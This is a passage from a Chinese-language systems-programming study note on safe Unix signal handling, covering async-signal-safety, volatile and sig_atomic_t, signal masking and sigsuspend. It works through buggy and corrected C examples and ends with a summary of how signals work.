的第三个参数的含义了：以指针传入，<strong>存储以前的信号掩码信息，便于之后的恢复工作</strong>。</p><h3 id="13-5-6-Safe-Signal-Handling-⚠IMPORTANT"><a href="#13-5-6-Safe-Signal-Handling-⚠IMPORTANT" class="headerlink" title="13.5.6 Safe Signal Handling [⚠IMPORTANT]"></a>13.5.6 Safe Signal Handling [⚠IMPORTANT]</h3><p>讨论完前面的知识，相信大家心里有点数了——信号非常难缠，不仅约定、机制和系统调用接口贼多，而且你必须小心再小心，否则会出大问题：</p><ul><li><p>不正确地处理信号会导致一些系统级问题，包括但不仅限于：</p><ul><li><p>内存泄漏（zombie 堆积等原因）；</p></li><li><p>共享内存访问冲突（<strong>死锁 dead lock、段错误 Segmentation fault 等问题都会出现</strong>。由于 signal handlers 与普通 user code 共享内存，但它们是并发的，很像一对<strong>并发的线程，thread</strong>），<strong>你要像写多线程程序一样小心，保证线程安全性</strong>；</p><blockquote><p>为什么？这还是因为 signal handlers 和 普通程序构成了<strong>并发流</strong>。</p><p>因为在 signal handler 执行前后，原程序都停留在 $I_{current}$ 的位置上，这样在 Logical Control Flow 上看，它们是并发的，<strong>几乎和两个线程的效果一样</strong>。</p><p>如果原程序正在改变一个诸如链表一样的数据结构，结果被 Exception 打断，进入了 signal handler；那么如果 signal handler 也改变了这个链表，当控制流回到原程序时，<strong>原程序并不知道自己的链表被改变了，因为从他的角度看，它还一步指令都没执行呢！</strong></p><p>⚠ 相信我，这种 Bug 非常难找，因为就算 <code>gdb</code> 也只能逐线程、逐进程地看。</p><p>所以在写 signal handlers 的时候，请<strong>一定注意访问全局 / 其他共享变量时的安全问题</strong>！！！</p></blockquote></li></ul></li><li><p>信号除了类型，没有其他语义。这是因为多个信号可能在接收时发生覆盖。<strong>因此我们不能用信号进行计数（即计信号发送了几次）</strong>！</p></li><li><p>不同版本的 Linux 中，<strong>信号的语义不同，难以移植</strong>；</p><ul><li>某些老旧系统在触发自定义的 signal handler 后，会重新变为 default action，需要重新设置。不过在 Linux 上不用担心；</li><li>某些系统根本不会在进程处理该类型信号时隐式阻塞；</li></ul><blockquote><p>为了解决这个问题，我们可以利用 <code>sigaction</code> 进行覆写处理。</p></blockquote></li><li><p>某些<strong>慢系统调用</strong>（类似 <code>read</code> 这样一定会触发 Process Context Switch 的）会使得 <code>errno</code> 变为 <code>EINTR</code>；</p><blockquote><p>因为如果触发慢系统调用的进程先于系统调用退出，那么系统调用会发生错误，并且设置 <code>errno</code> 为 <code>EINTR</code>；</p><p><strong>所以如果你在程序中发现这种错误，就重新进行这个系统调用</strong>；</p></blockquote></li></ul><p>那么怎样做是安全的呢？</p><ol><li><p>Signal Handlers 写的越简单越好，尽量能不往里面加代码，就不加；</p><blockquote><p>比如，你可以在一个信号函数中只是设置一个全局变量，然后立即返回；</p></blockquote></li><li><p>仅使用 <strong>异步信号安全（async-signal-safe）的</strong> 函数；</p><blockquote><p>什么是<strong>异步信号安全</strong>的函数？</p><p>它是指，一种函数是可重入（reentrant）的，也就是说，<strong>它访问的所有变量（包括指针的指向）都在自己的栈帧上</strong>。这样的函数在多线程、进程信号 handle 的时候，一定不会出现共享内存访问冲突，啥时候运行都不会改变语义。</p><p>事实上，POSIX 标准中保证了以下几种（共 117 种）函数一定是异步线程安全的：</p><p><code>_exit</code>（和 <code>exit</code> 不一样！它是系统调用接口，<code>exit</code> 是 C library 包装的系统级函数）、<code>write</code>、<code>wait</code>、<code>waitpid</code>、<code>sleep</code>、<code>kill</code>、……</p><p><strong>但不幸的是</strong>：</p><p><code>printf</code>、<code>sprintf</code>、<code>malloc</code>、<code>exit</code> 这些<strong>涉及 I/O 访问的、改变进程状态的系统调用或系统级函数</strong>大多都不是异步信号安全的，请谨慎在 signal handlers 里添加！</p><p>为什么它们不安全？因为它们会使用<strong>锁</strong>来对 I/O 设备或者变量进行读写，在 “多线程” 一章你会明白，这样很容易导致经典的死锁。</p><p><strong>所以……你一般没法在 signal handlers 里面打印输出内容……</strong>除非你能设计出一个能够对 signal handler 安全的 I/O 库。</p></blockquote></li><li><p>每次进入、退出 signal handlers 时<strong>应该保存、恢复 <code>errno</code> 变量，有助于系统错误追踪</strong>；</p><blockquote><p>因为在 signal handlers 被中断后，<strong>其他的 signal handlers 可能会更改掉 <code>errno</code></strong>；</p></blockquote></li><li><p><strong>在读写共享 / 全局变量时，请阻塞所有其他信号！！！</strong>这步操作保证当前 Signal Handler 不会被同进程的其他 signal handler 打断，<strong>相当于在多线程程序中加入读写锁</strong>；</p></li><li><p>如果你的 signal handlers 要用到一个全局变量，<strong>请将它声明为 <code>volatile</code></strong>。这一步也是在多线程编程中常见的。</p><blockquote><p>我们复习一下 C 中的关键字 <code>volatile</code>，这个关键字可以：<strong>阻止编译器优化由该关键字修饰的变量</strong>，即始终不将它放入寄存器中，<strong>每次读取都从内存中进行</strong>。这样做的好处是，多线程程序中的 <code>volatile</code> 变量不会发生值修改不同步的情况。</p><p>我们考虑以下情况：如果一个 signal handler 是修改某全局变量 <code>flag</code> 然后返回；该进程程序主体会定时检查这个 <code>flag</code>，做出相应动作。</p><p>如果我们在声明 <code>flag</code> 的时候，不加这个关键字，那么很有可能 <code>flag</code> 的值会被编译器解释成直接放到寄存器中，然后仅仅修改寄存器中的值。这样<strong>主程序可能永远也收不到 signal handler 更改的 <code>flag</code></strong>。</p></blockquote></li><li><p>如果你的全局变量是 <strong>仅读写的简单类型</strong>（数组、标准库中的容器是聚合类型，不是简单类型），除了加上 <code>volatile</code>，还建议使用 <code>sig_atomic_t</code> 类型。<strong>这就相当于多线程编程中的原子操作（<code>atomic&lt;&gt;</code>）</strong>；</p></li><li><p>对于一些慢系统调用，如果希望提升程序健壮性，应该在执行完检查是否 <code>errno == EINTR</code>，查看中途慢系统调用是否会被 Process Context Switch 阻断产生偶然错误；</p></li></ol><p>那么一个超级有难度的考题就来了——<strong>判断给定程序的异步信号安全性</strong>。来看下面一个程序：</p><p>这个 <code>fork14()</code> 想将自己创建的所有子进程通过信号的方式回收。这样做对吗？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ccount = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">child_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">if</span> ((pid = wait(<span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wait error&quot;</span>);</span><br><span class="line">    ccount--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Handler reaped child &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">long</span>)pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fork14</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid[N];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    ccount = N;</span><br><span class="line">    signal(SIGCHLD, child_handler);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pid[i] = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* Child exits */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (ccount &gt; <span class="number">0</span>) <span class="comment">/* Parent spins */</span></span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很遗憾，这样写可以说没有一点异步信号安全性。能够成功回收应该是小概率事件。</p><p>我们从简入繁地分析一下：</p><ul><li>上面的信号处理程序没有保存和恢复 <code>errno</code>，这样会造成不必要的错误追踪的麻烦；</li><li>很显然，<code>printf</code> 不是信号安全的，极其容易发生死锁。要么不用，要么换成异步信号安全的函数；</li><li><code>ccount</code> 变量没有添加 <code>volatile</code> 关键字，可能被编译器优化，甚至在 <code>child_handler</code> 减少了 <code>ccount</code> 后，<code>main</code> 都无法感知；</li><li>最严重的一个问题是，<strong>任何时候，都不应该用收到信号的次数来作为真正发送信号的次数</strong>。因为前面介绍过信号的发送和接收的过程：从信号发送给进程，到进程真正接收，中间至少间隔 2 次 Process Context Switch。在此期间，<strong>由于没有队列数据结构，所有重复的相同信号都会被覆盖成一次信号</strong>。此外，在进程处理该信号的同时，还有隐式阻塞的问题，也会产生相同信号覆盖的情况。</li></ul><p>现在我们来改正。当我们收到一个 <code>SIGCHILD</code> 信号时，应该假设有多个子进程都结束了（因为无法计数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">child_handler2</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="type">int</span> oldErrno = errno;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">while</span> ((pid = wait(<span class="literal">NULL</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        ccount--;    <span class="comment">/* 这里改成了回收子进程数，而不是依靠信号数来直接计数 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (errno != ECHILD)    <span class="comment">/* 说明上一个 wait 还没等完 */</span></span><br><span class="line">        sio_error(<span class="string">&quot;wait error&quot;</span>);    <span class="comment">/* 安全 I/O 库 */</span></span><br><span class="line">    errno = oldErrno;    <span class="comment">/* 用完 errno 后恢复它 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看一个更难的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>) &#123; <span class="comment">/* Reap child */</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">        deletejob(pid); <span class="comment">/* Delete the child from the job list */</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span> &amp;&amp; errno != ECHILD)</span><br><span class="line">        sio_error(<span class="string">&quot;waitpid error&quot;</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="type">int</span> n = N; <span class="comment">/* N = 5 */</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    signal(SIGCHLD, handler);</span><br><span class="line">    initjobs(); <span class="comment">/* Initialize the job list (a queue) */</span></span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123; <span class="comment">/* Child */</span></span><br><span class="line">            execve(<span class="string">&quot;/bin/date&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <span class="comment">/* Parent */</span></span><br><span class="line">        addjob(pid); <span class="comment">/* Add the child to the job list */</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这里的错误很难发现。在我们很早以前说 <code>fork</code> 的时候就讲过，<strong>不能保证父子进程的运行的时间顺序</strong>。这里可能会发生一个问题：<strong>在父进程 <code>addjob</code> 之前，<code>execve</code> 的子进程可能已经结束</strong>。这就意味着，父进程将一个已经结束的 job 加入 job list 中，这样任务队列永远不会为空。</p><p>如果要想 debug 找出，难点在于，你很难弄清楚各个父子进程间的 interleaving 的执行关系。所以在写信号的时候，一不留神就可能写出一个很恶心的 bug，还找不出来。</p><p>改正方法是，<strong>我们没法控制子进程和父进程执行的顺序，但我们可以控制 signal handler 执行的时机</strong>。我们在创建子进程前，阻塞所有信号（<strong>为什么？</strong>）。 在子进程中，在任务开始前，解除阻塞（<strong>又是为什么？</strong>）。</p><p>在创建子进程前阻塞所有信号，是为了<strong>让父进程在将任务添加到任务列表后，再考虑信号接收问题，防止 signal handler 在父进程还没加入任务列表时就被触发</strong>；</p><p>在创建子进程后，子进程开始后、<code>execve</code> 前解除阻塞，是因为要让 <code>SIGCHILD</code> 信号放出去，否则切换执行程序后就没有机会了。</p><p>于是改正后的程序长这样（<code>handler</code> 没有问题）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line">    <span class="type">int</span> n = N; <span class="comment">/* N = 5 */</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    signal(SIGCHLD, handler);</span><br><span class="line">    initjobs(); <span class="comment">/* Initialize the job list*/</span></span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">/* Block SIGCHLD */</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123; <span class="comment">/* Child process */</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">/* Unblock SIGCHLD */</span></span><br><span class="line">            execve(<span class="string">&quot;/bin/date&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">/* Parent process */</span></span><br><span class="line">        addjob(pid); <span class="comment">/* Add the child to the job list */</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">/* Unblock SIGCHLD */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>了解了这个方面的知识，我们可以明白一件事，我们在写一个这样的前后台程序的时候，如果不放心，可以用 <strong>进程图</strong> 模拟一下，确认自己的程序在各种极限情况下都能正常工作。</p><p>还有一个问题。在 shell lab 中，其实是不允许在 <code>main</code> 中写 <code>wait</code> 的，因为普通的 shell 程序都会将前台子进程的控制也交给信号，这样可以将前后台的处理方式大致统一。那么，<strong>怎么设计主程序能够显式的等待信号</strong>呢？别看这个好像很好办，实际要考虑的东西多得惊人。例如下面的一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">sig_atomic_t</span> pid;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sigchild_handler</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    pid = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">/* Main is waiting for nonzero pid */</span></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">    <span class="comment">/* Do something */</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, prev;</span><br><span class="line">    <span class="type">int</span> n = N; <span class="comment">/* N = 10 */</span></span><br><span class="line">    signal(SIGCHLD, sigchild_handler);</span><br><span class="line">    signal(SIGINT, sigint_handler);</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); <span class="comment">/* Block SIGCHLD */</span></span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) <span class="comment">/* Child: do somthing... */</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">/* Parent */</span></span><br><span class="line">        pid = <span class="number">0</span>;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>); <span class="comment">/* Unblock SIGCHLD */</span></span><br><span class="line">        <span class="comment">/* Wait for SIGCHLD to be received (wasteful!) */</span></span><br><span class="line">        <span class="keyword">while</span>(!pid)</span><br><span class="line">            ;</span><br><span class="line">        <span class="comment">/* Do some work after receiving SIGCHLD */</span></span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果能够写出上面的程序，那么前面的内容你都已经掌握了。这是个正确的程序，但是美中不足的是，父进程在等待子进程的时候，使用 <code>while (!pid);</code>，这样的做法比较低效，大部分 CPU 资源都浪费在无意义的 <code>while</code> 循环中了。</p><p>那么这个时候有同学可能会说，这简单，我可以在 <code>while(!pid)</code> 循环中加入一个 <code>pause</code> 系统调用，这样有 <code>SIGCHILD</code> 或者 <code>SIGINT</code> 触发后，程序可以自动从 <code>pause</code> 中退出，然后判断一遍 <code>pid</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!pid) pause();</span><br></pre></td></tr></table></figure><p>很可惜，这样<strong>可能会造成死锁</strong>。我们不妨画一个进程图，发现如果子进程向父进程发送信号，而且 Process Context Switch 的位置位于 <code>while (!pid)</code> 和 <code>pause()</code> 之间，那么，程序会先接收并处理 <code>SIGCHILD</code> / <code>SIGINT</code> 然后进入 <code>pause</code>。想象一下，如果这正好是最后一个给父进程发信号的进程呢？那么父进程会永远 stopped 在 <code>pause</code> 中。</p><p>同学还想了，那我换成 <code>sleep(1)</code> 不就不会死锁了吗？行是行，但是每隔一秒才检查一次子进程会严重拖慢程序运行速度。而设置为其他的固定时间，要么太慢（速度问题），要么太快（和没有 <code>sleep</code> 的效率一样低下）。</p><p>那么我们可不可以不那么快地恢复对 <code>SIGCHILD</code> 的响应（第 25 行）？让 “恢复 <code>SIGCHILD</code> 响应” 和 “<code>pause</code> 执行” 成为一对原子操作。那么答案就是新的系统调用：<strong><code>sigsuspend</code></strong>;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sigsuspend</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *mask)</span>;</span><br></pre></td></tr></table></figure><p>它等价于以下 3 条指令的 <strong>整体原子操作</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>这样，我们只需要在阻塞 <code>SIGCHILD</code> 的时候，在 <code>while</code> 循环中调用 <code>sigsuspend(&amp;prev)</code>，这样  “取消 <code>SIGCHILD</code> 阻塞” 的行为 和 “<code>pause()</code> 执行” 的行为就原子化了，无需担心中间的死锁问题。这样如果有信号，并且交由 signal handlers 处理后，重新开始对 <code>SIGCHILD</code> 的阻塞，并检查 <code>pid</code>，完美实现要求。于是改进代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">sig_atomic_t</span> pid;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sigchild_handler</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    pid = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">/* Main is waiting for nonzero pid */</span></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">    <span class="comment">/* Do something */</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, prev;</span><br><span class="line">    <span class="type">int</span> n = N; <span class="comment">/* N = 10 */</span></span><br><span class="line">    signal(SIGCHLD, sigchild_handler);</span><br><span class="line">    signal(SIGINT, sigint_handler);</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); <span class="comment">/* Block SIGCHLD */</span></span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) <span class="comment">/* Child: do somthing... */</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* Parent */</span></span><br><span class="line">        pid = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* Wait for SIGCHLD to be received */</span></span><br><span class="line">        <span class="comment">/* SIGCHILD is still blocked */</span></span><br><span class="line">        <span class="keyword">while</span>(!pid)</span><br><span class="line">            sigsuspend(&amp;prev);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* Unblock SIGCHLD (optional) */</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">/* Do some work after receiving SIGCHLD */</span></span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-5-7-Summary-of-Signals"><a href="#13-5-7-Summary-of-Signals" class="headerlink" title="13.5.7 Summary of Signals"></a>13.5.7 Summary of Signals</h3><p>在讨论信号有关概念之前，我们先认识了 Linux 中的 “进程树” 这种进程层次结构。我们了解到，Linux 一号进程是 <code>init</code> 进程，它是所有进程的父进程。<code>init</code> 进程则会启动两类进程，一种是 <code>Daemon</code> 守护进程，另一种是 <code>Login Shell</code> 命令行。</p><p>我们利用之前对于进程控制的知识尝试写了一个小的 Demo，却发现对于运行在后台的子进程，我们没有办法 handle 它们。为了解决这个问题，我们引入了 Linux 系统中的信号的概念。</p><p>信号是一个小整型，由 OS Kernel 发出，用来通知进程事件发生、要求处理的一种高级 ECF 机制。</p><p>信号的发送和接收的非同时性决定了信号必须在 OS Kernel 中以一种数据结构存储起来，以供目标进程对信号的接收。这种数据结构非常朴素，只是一个 Pending bit vector 和一个 Blocked bit vector，这样的存储方式注定了 <strong>信号在接收过程中可能被覆盖</strong>，因此接收信号的次数不能代表信号发送的次数；</p><p>信号机制运作的流程看起来很简单：</p><ol><li><p>某一时刻，位于某个进程的 OS Kernel 向 Process A 发送一个信号，于是改变了 Process A 的 Pending bit vector；</p></li><li><p>当某次 Process Context Switch 即将切换到 Process A 前，OS Kernel 检查 <code>pnb = pending &amp; ~blocking</code> 的情况；发现有信号，那么对每个信号都进行处理：进入对应的 signal handler 并重置该位 pending bit vector；</p><blockquote><p>由于 signal handler 位于用户态，共享了原程序的一切内存，因此 signal handler 和 原程序在 Logical Control Flow 上成为一对共享资源的<strong>并行流</strong>，这个情况与多线程等效，但<strong>给信号处理和数据访问带来了极大的不安全性</strong>。</p></blockquote></li><li><p>signal handler 执行中，由于是用户态代码，所以仍然可能会出现 Process Context Switch，因此免不了有 Nested Signals Handlers 的情况。不过，一般的 OS Kernel 会帮助我们将正在处理的相同信号阻塞起来（<strong>隐式阻塞</strong>），防止多次调用相同的 signal handler；</p></li><li><p>在 signal handlers 调用完成后，控制流先回到 OS Kernel 恢复 $I_{next}$ 等必需数据然后继续原程序 $I_{next}$ 执行。</p></li></ol><p>只是，别小看这个 <strong>同进程并行流的不安全性</strong>，如果在书写 signal handlers 